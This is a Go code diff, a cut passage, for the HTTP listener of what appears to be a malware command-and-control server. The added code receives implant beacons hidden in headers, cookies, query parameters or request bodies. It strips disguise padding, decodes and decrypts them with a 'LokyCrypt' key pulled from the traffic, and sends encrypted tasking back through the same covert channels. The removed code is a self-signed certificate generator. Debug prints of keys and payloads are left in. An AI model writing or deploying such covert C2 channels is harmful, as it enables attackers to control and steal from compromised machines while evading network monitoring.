+						responseData = []byte(base64.URLEncoding.EncodeToString(combined))
+					case "raw":
+						responseData = combined
+					}
+
+					fmt.Printf("[INFO] Response key: %02x\n", key)
+
+					server.Payload = responseData
+				}
+			case TASK_RESULT:
+				if len(agentData) > 1 {
+					processData := agentData[1:]
+					_ = ModuleObject.ts.TsAgentProcessData(oldAgentID, processData)
+				}
+			case TASK_OUT:
+				msgTypePattern := append([]byte{0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0}, agentData...)
+				_ = ModuleObject.ts.TsAgentProcessData(oldAgentID, msgTypePattern)
+			case TASK_QUICK:
+				msgTypePattern := append([]byte{0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0}, agentData...)
+				_ = ModuleObject.ts.TsAgentProcessData(oldAgentID, msgTypePattern)
+			default:
+				fmt.Printf("[ERROR] Unknown data type: %d\n", taskAction)
+			}
+		}
+	}
+
+	handler.apply_server_headers(ctx, httpMethod)
+
+	if len(server.Payload) > 0 {
+		fmt.Printf("[INFO] Sending response (%d bytes) to agent: %s\n", len(server.Payload), oldAgentID)
+		fmt.Println(formatHexDump(server.Payload, 16))
+
+		if serverOutput != nil && serverOutput.Header != "" {
+			ctx.Writer.Header().Set(serverOutput.Header, string(server.Payload))
+			ctx.Status(http.StatusOK)
+
+			if len(serverOutput.Body) > 0 {
+				ctx.Writer.Write([]byte(serverOutput.Body))
+			}
+		} else if serverOutput != nil && serverOutput.Parameter != "" {
+			// Parameter output - response in body
+			ctx.Status(http.StatusOK)
+			ctx.Writer.Write([]byte(server.Payload))
+		} else if serverOutput != nil && serverOutput.Cookie != "" {
+			// Cookie output - response in Set-Cookie header
+			ctx.Writer.Header().Set("Set-Cookie", fmt.Sprintf("%s=%s", serverOutput.Cookie, string(server.Payload)))
+			ctx.Status(http.StatusOK)
+
+			if len(serverOutput.Body) > 0 {
+				ctx.Writer.Write([]byte(serverOutput.Body))
+			}
+		} else {
+			ctx.Writer.Write([]byte(server.Payload))
+			ctx.Status(http.StatusOK)
+		}
+	} else {
+		fmt.Printf("[INFO] Sending empty response to agent: %s\n", oldAgentID)
+		fmt.Println(formatHexDump(server.Payload, 16))
+
+		if serverOutput != nil && serverOutput.Header != "" {
+			fmt.Printf("[DEBUG] Output in header: %s\n", serverOutput.Header)
+			ctx.Writer.Header().Set(serverOutput.Header, string(server.EmptyResp))
+			ctx.Status(http.StatusOK)
+
+			if len(serverOutput.Body) > 0 {
+				ctx.Writer.Write([]byte(serverOutput.Body))
+			}
+		} else if serverOutput != nil && serverOutput.Parameter != "" {
+			// Parameter output - response in body
+			fmt.Printf("[DEBUG] Output in parameter\n")
+			ctx.Status(http.StatusOK)
+			ctx.Writer.Write([]byte(server.EmptyResp))
+		} else if serverOutput != nil && serverOutput.Cookie != "" {
+			// Cookie output - response in Set-Cookie header
+			fmt.Printf("[DEBUG] Output in cookie: %s\n", serverOutput.Cookie)
+			ctx.Writer.Header().Set("Set-Cookie", fmt.Sprintf("%s=%s", serverOutput.Cookie, string(server.EmptyResp)))
+			ctx.Status(http.StatusOK)
+
+			if len(serverOutput.Body) > 0 {
+				ctx.Writer.Write([]byte(serverOutput.Body))
+			}
+		} else {
+			fmt.Printf("[DEBUG] Output in body\n")
+			ctx.Writer.Write([]byte(server.EmptyResp))
+			ctx.Status(http.StatusOK)
+		}
+	}
+
+	ctx.Abort()
 }
 
-func (handler *HTTP) parseBeatAndData(ctx *gin.Context) (string, []byte, []byte, error) {
-
-	bodyData, err := io.ReadAll(ctx.Request.Body)
-	if err != nil {
-		return "", nil, nil, errors.New("missing agent data")
-	}
-
-	agentInfoCrypt, err := base64.StdEncoding.DecodeString(string(bodyData))
-	if err != nil {
-		return "", nil, nil, errors.New("missing agent data")
-	}
-
-	if len(agentInfoCrypt) < 36 {
-		return "", nil, nil, errors.New("missing agent data")
-	}
-
-	decryptedPart := agentInfoCrypt[36:]
-
-	return "c17a905a", agentInfoCrypt[:36], decryptedPart, nil
-}
-
-func (handler *HTTP) generateSelfSignedCert(certFile, keyFile string) error {
+func (handler *HTTP) parse_client_data(ctx *gin.Context, client *ClientRequest, output *OutputConfig) (string, []byte, bool, error) {
 	var (
-		certData   []byte
-		keyData    []byte
-		certBuffer bytes.Buffer
-		keyBuffer  bytes.Buffer
-		privateKey *rsa.PrivateKey
-		err        error
+		old_agent_id   []byte
+		agent_adp_id   []byte
+		full_data 	   io.Reader
+		processed_data []byte
+		agent_exist    bool
+
+		key            []byte
+		crypt          *LokyCrypt
+		encrypted_data []byte
+		decrypted_data []byte
 	)
+    
+	if output.Header != "" {
+		headerValue := ctx.GetHeader(output.Header)
+		if headerValue == "" {
+			return "", nil, false, errors.New("header not found")
+		}
+		full_data = strings.NewReader(headerValue)
+	} else if output.Cookie != "" {
+		cookieValue, err := ctx.Cookie(output.Cookie)
+		if err != nil || cookieValue == "" {
+			return "", nil, false, errors.New("cookie not found")
+		}
+		
+		fmt.Printf("cookie key: %s\n", output.Cookie)
+		fmt.Printf("cookie value: %s\n", cookieValue)
+		fmt.Printf("cookie value length: %d\n", len(cookieValue))
+		fmt.Printf("cookie value hex: %x\n", cookieValue)
+		
+		full_data = strings.NewReader(cookieValue)
+	} else if output.Parameter != "" {
+		fmt.Printf("param key: %s\n", output.Parameter)
+		paramValue := ctx.Query(output.Parameter)
+		fmt.Printf("param value from Query: %s\n", paramValue)
+		if paramValue == "" {
+			paramValue = ctx.Param(output.Parameter)
+			fmt.Printf("param value from Param: %s\n", paramValue)
+		}
+		if paramValue == "" {
+			return "", nil, false, errors.New("parameter not found")
+		}
 
-	privateKey, err = rsa.GenerateKey(rand.Reader, 2048)
-	if err != nil {
-		return fmt.Errorf("failed to generate private key: %v", err)
+		fmt.Printf("using parameter value: %s\n", paramValue)
+		fmt.Printf("param value length: %d\n", len(paramValue))
+		fmt.Printf("param value hex: %x\n", paramValue)
+		
+		full_data = bytes.NewBuffer([]byte(paramValue))
+	} else {
+		body_data, err := io.ReadAll(ctx.Request.Body)
+		if err != nil {
+			return "", nil, false, fmt.Errorf("failed to read request body: %v", err)
+		}
+
+		ctx.Request.Body = io.NopCloser(bytes.NewBuffer(body_data))
+		full_data = bytes.NewBuffer(body_data)
+	}
+    
+    agent_data, err := io.ReadAll(full_data)
+    if err != nil {
+        return "", nil, false, fmt.Errorf("failed to read agent data: %v", err)
+    }
+    
+    if len(agent_data) == 0 {
+        return "", nil, false, errors.New("missing agent data")
+    }
+    
+    processed_data = agent_data
+    
+    if output.Prepend != "" {
+        prepend_bytes := []byte(output.Prepend)
+        if len(agent_data) >= len(prepend_bytes) && bytes.HasPrefix(agent_data, prepend_bytes) {
+            processed_data = agent_data[len(prepend_bytes):]
+        } else {
+            return "", nil, false, errors.New("prepend not found in data")
+        }
+    }
+    
+    if output.Append != "" {
+        append_data := []byte(output.Append)
+        if len(processed_data) >= len(append_data) && bytes.HasSuffix(processed_data, append_data) {
+            processed_data = processed_data[:len(processed_data) - len(append_data)]
+        } else {
+            return "", nil, false, errors.New("append not found in data")
+        }
+    }
+    
+    var formatted []byte
+    switch output.Format {
+    case "base32":
+        decoded, err := base32.StdEncoding.DecodeString(string(processed_data))
+        if err != nil {
+            return "", nil, false, fmt.Errorf("base32 decode failed: %v", err)
+        }
+        formatted = decoded
+    case "base64":
+        decoded, err := base64.StdEncoding.DecodeString(string(processed_data))
+        if err != nil {
+            return "", nil, false, fmt.Errorf("base64 decode failed: %v", err)
+        }
+        formatted = decoded
+    case "base64url":
+        decoded, err := base64.URLEncoding.DecodeString(string(processed_data))
+        if err != nil {
+            return "", nil, false, fmt.Errorf("base64url decode failed: %v", err)
+        }
+        formatted = decoded
+	case "hex": {
+		decoded, err := hex.DecodeString(string(processed_data))
+		if err != nil {
+			return "", nil, false, fmt.Errorf("hex decode failed: %v", err)
+		}
+		formatted = decoded
+	}
+    default:
+        formatted = processed_data
+    }
+    
+    if len(formatted) < 36 {
+        return "", nil, false, fmt.Errorf("insufficient data length: got %d bytes, need at least 36", len(formatted))
+    }
+    
+    total_len := len(formatted)
+    if total_len < 36 { 
+        return "", nil, false, errors.New("data too short for decryption")
+    }
+
+	old_agent_id = formatted[:36]
+	agent_adp_id = old_agent_id[:8]
+
+	fmt.Printf("old agentid: %s\n", old_agent_id)
+
+    agent_exist = ModuleObject.ts.TsAgentIsExists(string(agent_adp_id))
+    if !agent_exist {
+		extracted_key := formatted[total_len-16:]
+
+		fmt.Printf("here if\n")
+		
+		handler.Config.EncryptKey = make([]byte, 16)
+		copy(handler.Config.EncryptKey, extracted_key)
+
+		fmt.Printf("here if\n")
+		
+		key = handler.Config.EncryptKey
+		encrypted_data = formatted[36 : total_len-16]
+	} else {
+		fmt.Printf("here else\n")
+		key = handler.Config.EncryptKey
+		encrypted_data = formatted[36:]
 	}
 
-	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
-	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
-	if err != nil {
-		return fmt.Errorf("failed to generate serial number: %v", err)
-	}
-
-	template := x509.Certificate{
-		SerialNumber: serialNumber,
-		NotBefore:    time.Now(),
-		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
-
-		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
-		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
-		BasicConstraintsValid: true,
-	}
-
-	template.DNSNames = []string{ handler.Config.HostBind }
-
-	certData, err = x509.CreateCertificate( rand.Reader, &template, &template, &privateKey.PublicKey, privateKey )
-	if err != nil {
-		return fmt.Errorf("failed to create certificate: %v", err)
-	}
-
-	err = pem.Encode(&certBuffer, &pem.Block{Type: "CERTIFICATE", Bytes: certData})
-	if err != nil {
-		return fmt.Errorf("failed to write certificate: %v", err)
-	}
-
-	handler.Config.SslCert = certBuffer.Bytes()
-	err = os.WriteFile(certFile, handler.Config.SslCert, 0644)
-	if err != nil {
-		return fmt.Errorf("failed to create certificate file: %v", err)
-	}
-
-	keyData = x509.MarshalPKCS1PrivateKey(privateKey)
-	err = pem.Encode(&keyBuffer, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: keyData})
-	if err != nil {
-		return fmt.Errorf("failed to write private key: %v", err)
-	}
-
-	handler.Config.SslKey = keyBuffer.Bytes()
-	err = os.WriteFile(keyFile, handler.Config.SslKey, 0644)
-	if err != nil {
-		return fmt.Errorf("failed to create key file: %v", err)
-	}
-
-	return nil
+    fmt.Printf("fmt key: %v\n", key)
+    fmt.Printf("fmt key handler: %v\n", handler.Config.EncryptKey)
+    
+    if len(encrypted_data) == 0 {
+        return "", nil, false, errors.New("no encrypted data available")
+    }
+    
+    crypt = NewLokyCrypt(key, key)
+    decrypted_data = crypt.Decrypt(encrypted_data)
+    
+    client.Payload = decrypted_data
+    
+    return "c17a905a", old_agent_id, agent_exist, nil
 }
